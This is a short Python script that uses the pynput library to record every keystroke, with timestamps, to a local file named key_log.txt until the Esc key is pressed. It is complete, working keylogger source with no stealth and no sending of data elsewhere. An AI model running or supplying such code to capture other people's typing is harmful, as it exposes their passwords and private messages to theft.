from pynput.keyboard import Key, Listener
import logging

# Set up logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define on_press function to log each key press
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
# Define on_release function to stop the listener
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up and start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
